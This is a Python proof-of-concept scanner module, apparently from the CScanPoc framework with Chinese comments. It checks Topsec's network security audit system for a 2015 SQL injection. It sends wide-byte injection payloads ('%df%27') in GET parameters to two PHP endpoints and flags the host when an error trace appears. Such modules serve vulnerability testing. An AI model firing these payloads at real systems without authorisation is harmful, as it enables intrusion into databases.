# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import time


class Vuln(ABVuln):
    vuln_id = 'TOPSEC_0032'  # 平台漏洞编号，留空
    name = '天融信网络卫士安全审计系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-08-20'  # 漏洞公布时间
    desc = '''
        天融信网络卫士安全审计系统存在SQL注入漏洞。
        /policy/cap/delete.php
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '天融信审计系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '09665c59-e705-4861-8d65-f4301619e349'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-28'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # Refer http://www.wooyun.org/bugs/wooyun-2015-0135532
            hh = hackhttp.hackhttp()
            arg = self.target
            payloads = (
                '/policy/cap/delete.php?returnfile=timegrouptable.php&TABLE=timegroup&deletename=sqltestvul%df%27&name=timegroupname',
                '/policy/kw/delkeywd.php?kwtypename=sqltestvul%df%27'
            )
            for payload in payloads:
                url = arg + payload
                code, head, res, errcode, _url = hh.http(url)
                m = re.findall('thrown in <b>(.*?)</b>', res)
                # print m
                if code == 200 and m:
                    # security_hole(url)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
